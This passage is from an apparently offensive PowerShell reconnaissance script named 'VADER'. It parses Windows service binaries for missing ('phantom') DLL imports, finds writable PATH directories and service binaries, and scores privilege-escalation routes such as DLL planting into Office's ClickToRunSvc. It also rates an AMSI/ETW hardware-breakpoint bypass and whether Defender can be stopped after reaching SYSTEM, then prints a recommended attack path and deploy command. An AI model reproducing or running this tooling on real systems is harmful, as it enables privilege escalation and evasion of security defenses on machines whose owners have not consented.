        if ($IncludeDelayLoad -and ($optStart + $delayDirOffset + 8) -le ($optStart + $optHeaderSize)) {
            $stream.Position = $optStart + $delayDirOffset
            $delayRVA = $reader.ReadUInt32()
            $reader.ReadUInt32() | Out-Null  # size
        }

        # Read section headers for RVA-to-file-offset conversion
        $stream.Position = $optStart + $optHeaderSize
        $sections = @()
        for ($i = 0; $i -lt $numSections; $i++) {
            $sName = [System.Text.Encoding]::ASCII.GetString($reader.ReadBytes(8)).TrimEnd([char]0)
            $virtualSize = $reader.ReadUInt32()
            $virtualAddr = $reader.ReadUInt32()
            $rawSize = $reader.ReadUInt32()
            $rawAddr = $reader.ReadUInt32()
            $reader.ReadBytes(16) | Out-Null  # relocs, linenums, characteristics
            $sections += [PSCustomObject]@{
                VirtualAddress = $virtualAddr
                VirtualSize = $virtualSize
                RawAddress = $rawAddr
            }
        }

        # RVA to file offset converter
        function RvaToOffset($rva) {
            foreach ($s in $sections) {
                if ($rva -ge $s.VirtualAddress -and $rva -lt ($s.VirtualAddress + $s.VirtualSize)) {
                    return $rva - $s.VirtualAddress + $s.RawAddress
                }
            }
            return -1
        }

        # Read null-terminated ASCII string at file offset
        function ReadAsciiAt($offset) {
            $stream.Position = $offset
            $bytes = @()
            for ($j = 0; $j -lt 256; $j++) {
                $b = $reader.ReadByte()
                if ($b -eq 0) { break }
                $bytes += $b
            }
            return [System.Text.Encoding]::ASCII.GetString($bytes)
        }

        # Parse normal import directory (20-byte entries)
        if ($importRVA -ne 0) {
            $off = RvaToOffset $importRVA
            if ($off -ge 0) {
                $stream.Position = $off
                while ($true) {
                    $reader.ReadUInt32() | Out-Null  # ILT RVA
                    $reader.ReadUInt32() | Out-Null  # TimeDateStamp
                    $reader.ReadUInt32() | Out-Null  # ForwarderChain
                    $nameRVA = $reader.ReadUInt32()
                    $reader.ReadUInt32() | Out-Null  # IAT RVA
                    if ($nameRVA -eq 0) { break }
                    $saved = $stream.Position
                    $nameOff = RvaToOffset $nameRVA
                    if ($nameOff -ge 0) {
                        $result.Normal += ReadAsciiAt $nameOff
                    }
                    $stream.Position = $saved
                }
            }
        }

        # Parse delay-load import directory (32-byte entries on PE32+, 32 on PE32)
        if ($delayRVA -ne 0) {
            $off = RvaToOffset $delayRVA
            if ($off -ge 0) {
                $stream.Position = $off
                while ($true) {
                    $reader.ReadUInt32() | Out-Null  # Attributes
                    $dlNameRVA = $reader.ReadUInt32()
                    if ($dlNameRVA -eq 0) { break }
                    $reader.ReadBytes(24) | Out-Null  # remaining fields
                    $saved = $stream.Position
                    $nameOff = RvaToOffset $dlNameRVA
                    if ($nameOff -ge 0) {
                        $result.DelayLoad += ReadAsciiAt $nameOff
                    }
                    $stream.Position = $saved
                }
            }
        }

        $stream.Close()
    } catch {
        if ($stream) { try { $stream.Close() } catch {} }
    }
    return $result
}

# Build KnownDLLs set for cross-reference
$knownDlls = @{}
$kdRegPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
$kdProps = Get-ItemProperty $kdRegPath -ErrorAction SilentlyContinue
if ($kdProps) {
    foreach ($prop in $kdProps.PSObject.Properties) {
        if ($prop.Name -notlike "PS*" -and $prop.Name -ne "DllDirectory" -and $prop.Name -ne "DllDirectory32") {
            $knownDlls[$prop.Value.ToLower()] = $true
        }
    }
}
W "  KnownDLLs count: $($knownDlls.Count)"

# Build writable PATH dirs set (ACL check + practical write test)
function Test-WritablePractical {
    param([string]$Path)
    if (Test-Writable $Path) { return $true }
    if (-not (Test-Path $Path)) { return $false }
    $testFile = Join-Path $Path ".vader_write_test_$(Get-Random)"
    try {
        [System.IO.File]::WriteAllText($testFile, "test")
        Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        return $false
    }
}

$writablePathDirs = @()
$machinePath = [Environment]::GetEnvironmentVariable("Path","Machine") -split ";"
foreach ($d in $machinePath) {
    $dt = $d.Trim()
    if (-not $dt) { continue }
    if (Test-WritablePractical $dt) { $writablePathDirs += $dt }
}
W "  Writable PATH dirs: $($writablePathDirs.Count)"
foreach ($wd in $writablePathDirs) { W "    $wd" }
W ""

# Scan SYSTEM services for phantom DLL imports
$phantomFindings = @()
$svcBinaries = @{}

$systemSvcs = Get-WmiObject Win32_Service | Where-Object {
    ($_.StartName -eq "LocalSystem" -or $_.StartName -match "SYSTEM") -and $_.PathName
}

W "  Scanning $($systemSvcs.Count) SYSTEM services..."
W ""

$scannedCount = 0
foreach ($svc in $systemSvcs) {
    $binPath = $svc.PathName
    if ($binPath.StartsWith('"')) { $exePath = ($binPath -split '"')[1] }
    else { $exePath = ($binPath -split ' ')[0] }

    if (-not (Test-Path $exePath)) { continue }
    if ($svcBinaries.ContainsKey($exePath.ToLower())) { continue }
    $svcBinaries[$exePath.ToLower()] = $true

    $exeDir = Split-Path $exePath -Parent

    # Parse PE imports
    $imports = Get-PEImports -FilePath $exePath -IncludeDelayLoad
    if ((-not $imports.Normal) -and (-not $imports.DelayLoad)) { continue }

    $scannedCount++
    $allImports = @()
    foreach ($dll in $imports.Normal)    { $allImports += @{ Name = $dll; Type = "NORMAL" } }
    foreach ($dll in $imports.DelayLoad) { $allImports += @{ Name = $dll; Type = "DELAY" } }

    foreach ($imp in $allImports) {
        $dllName = $imp.Name.ToLower()
        $impType = $imp.Type

        # Skip API sets (api-ms-win-*, ext-ms-win-*)
        if ($dllName -match "^(api-ms-|ext-ms-)") { continue }
        # Skip KnownDLLs (protected from hijack)
        if ($knownDlls.ContainsKey($dllName)) { continue }

        # Check if DLL exists in expected locations
        $inAppDir = Test-Path (Join-Path $exeDir $dllName)
        $inSys32  = Test-Path (Join-Path "C:\Windows\System32" $dllName)
        $inSysWow = Test-Path (Join-Path "C:\Windows\SysWOW64" $dllName)
        $inWinDir = Test-Path (Join-Path "C:\Windows" $dllName)

        if (-not $inAppDir -and -not $inSys32 -and -not $inSysWow -and -not $inWinDir) {
            # PHANTOM DLL: not found anywhere on disk
            $plantable = $writablePathDirs.Count -gt 0
            $severity = if ($plantable) { "CRITICAL" } else { "HIGH" }
            $detail = "Service '$($svc.Name)' ($($svc.StartName)) $impType-imports '$($imp.Name)' -- NOT ON DISK"
            if ($plantable) { $detail += " -- PLANTABLE via writable PATH" }

            WF $severity "PHANTOM_DLL" $detail
            $phantomFindings += [PSCustomObject]@{
                Service = $svc.Name
                Display = $svc.DisplayName
                Account = $svc.StartName
                Binary  = $exePath
                DLL     = $imp.Name
                Type    = $impType
                Plantable = $plantable
            }
        }
    }
}

W ""
W "  Services scanned (unique binaries): $scannedCount"
W "  Phantom DLLs found: $($phantomFindings.Count)"
if ($phantomFindings.Count -gt 0) {
    W ""
    W "  --- PHANTOM DLL DETAIL ---"
    foreach ($pf in $phantomFindings) {
        W "  Service:  $($pf.Service) ($($pf.Display))"
        W "  Account:  $($pf.Account)"
        W "  Binary:   $($pf.Binary)"
        W "  Phantom:  $($pf.DLL) ($($pf.Type)-load)"
        W "  Plantable: $($pf.Plantable)"
        W "  ---"
    }
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 20: VADER VECTOR ASSESSMENT
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 20: VADER VECTOR ASSESSMENT ==="
W ""

# Score each VADER vector based on collected data
$v4Score = 0; $v4Notes = @()
$v6Score = 0; $v6Notes = @()
$v7Score = 0; $v7Notes = @()
$drScore = 0; $drNotes = @()

# V4 DELTA — Service Binary Replacement
if ($writableSvcs.Count -gt 0) {
    $v4Score = 80
    $v4Notes += "[+] $($writableSvcs.Count) writable SYSTEM service(s) found"
    foreach ($ws in $writableSvcs) {
        $v4Notes += "    Target: $($ws.Name) at $($ws.ExePath)"
    }
} else {
    $v4Notes += "[-] No writable SYSTEM service binaries"
}

# V6 FOXTROT — PATH DLL Hijack
if ($writablePathDirs.Count -gt 0) {
    $v6Score = 40
    $v6Notes += "[+] $($writablePathDirs.Count) writable dir(s) in machine PATH"
    if ($phantomFindings.Count -gt 0) {
        $v6Score = 70
        $v6Notes += "[+] Phantom DLL targets available for PATH plant"
    } else {
        $v6Notes += "[~] No phantom DLL targets -- need Process Monitor to find DLL search misses"
    }
} else {
    $v6Notes += "[-] No writable directories in machine PATH"
}

# V7 GOLF — Phantom DLL (osppc.dll / ClickToRunSvc)
$officeFound = $false
$osppcPhantom = $false
foreach ($pf in $phantomFindings) {
    if ($pf.DLL -match "osppc" -or $pf.Service -match "ClickToRun") {
        $osppcPhantom = $true
        $officeFound = $true
    }
}
if (-not $officeFound) {
    $officeSvc = Get-Service -Name "ClickToRunSvc" -ErrorAction SilentlyContinue
    if ($officeSvc) { $officeFound = $true }
}
if ($officeFound) {
    $v7Notes += "[+] Office ClickToRunSvc detected"
    if ($osppcPhantom) {
        $v7Score = 90
        $v7Notes += "[+] osppc.dll confirmed PHANTOM (not on disk)"
        if ($writablePathDirs.Count -gt 0) {
            $v7Score = 95
            $v7Notes += "[+] Writable PATH dir available for DLL plant"
        }
    } else {
        $v7Score = 30
        $v7Notes += "[~] osppc.dll not detected as phantom -- may exist on this install"
    }
} else {
    $v7Notes += "[-] Office ClickToRunSvc not found"
}

# Dark Room — AMSI/ETW HWBP viability
$drScore = 70
$drNotes += "[+] HWBP bypass requires no elevation (standard user)"
$drNotes += "[+] SetThreadContext on own threads -- no behavioral signature"
try {
    $mpStatus = Get-MpComputerStatus -ErrorAction Stop
    if ($mpStatus.RealTimeProtectionEnabled) {
        $drNotes += "[~] RTP active -- dark room needed before payload execution"
    }
    if ($mpStatus.IsTamperProtected) {
        $drNotes += "[*] Tamper Protection ON -- cannot disable Defender post-SYSTEM without reboot"
    } else {
        $drScore = 80
        $drNotes += "[+] Tamper Protection OFF -- Defender can be stopped after achieving SYSTEM"
    }
} catch {
    $drNotes += "[~] Cannot query Defender status"
}

# Display assessment
W "  ┌─────────────────────────────────────────────────┐"
W "  │  V7 GOLF (phantom_dll)    Score: $($v7Score.ToString().PadLeft(3))/100     │"
W "  └─────────────────────────────────────────────────┘"
foreach ($n in $v7Notes) { W "  $n" }
W ""
W "  ┌─────────────────────────────────────────────────┐"
W "  │  V4 DELTA (svc_replace)   Score: $($v4Score.ToString().PadLeft(3))/100     │"
W "  └─────────────────────────────────────────────────┘"
foreach ($n in $v4Notes) { W "  $n" }
W ""
W "  ┌─────────────────────────────────────────────────┐"
W "  │  V6 FOXTROT (path_hijack) Score: $($v6Score.ToString().PadLeft(3))/100     │"
W "  └─────────────────────────────────────────────────┘"
foreach ($n in $v6Notes) { W "  $n" }
W ""
W "  ┌─────────────────────────────────────────────────┐"
W "  │  DARK ROOM (AMSI+ETW)     Score: $($drScore.ToString().PadLeft(3))/100     │"
W "  └─────────────────────────────────────────────────┘"
foreach ($n in $drNotes) { W "  $n" }
W ""

# Recommended attack path
$vectors = @(
    [PSCustomObject]@{ ID="V7"; Name="GOLF"; Score=$v7Score },
    [PSCustomObject]@{ ID="V4"; Name="DELTA"; Score=$v4Score },
    [PSCustomObject]@{ ID="V6"; Name="FOXTROT"; Score=$v6Score }
) | Sort-Object Score -Descending

$primary = $vectors[0]
$fallback = $vectors | Where-Object { $_.Score -gt 0 -and $_.ID -ne $primary.ID } | Select-Object -First 1

W "  ═══════════════════════════════════════════════════"
W "  RECOMMENDED ATTACK PATH:"
if ($primary.Score -gt 0) {
    W "    PRIMARY:  $($primary.ID) $($primary.Name) (score $($primary.Score))"
    if ($fallback) {
        W "    FALLBACK: $($fallback.ID) $($fallback.Name) (score $($fallback.Score))"
    }
    W "    DARK ROOM: $(if ($drScore -ge 70) { 'VIABLE' } else { 'CHECK PREREQUISITES' })"
    W ""
    W "  DEPLOY COMMAND:"
    W "    python deploy.py --pentest --skip-recon"
} else {
    W "    NO VIABLE VECTORS FOUND"
    W "    Manual analysis required (Process Monitor, deeper service audit)"
}
W "  ═══════════════════════════════════════════════════"
W ""

# ═══════════════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════════════

WH "================================================================"
WH "  RECON COMPLETE"
WH "  Output: $outFile"
WH "  Hostname: $hostname"
WH "  Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
WH "  Sections: 20"
WH "  Phantom DLLs: $($phantomFindings.Count)"
WH "  Recommended: $($primary.ID) $($primary.Name) (score $($primary.Score))"
WH "================================================================"
W ""

Write-Host ""
Write-Host "  Log written to: $outFile" -ForegroundColor Green
Write-Host ""
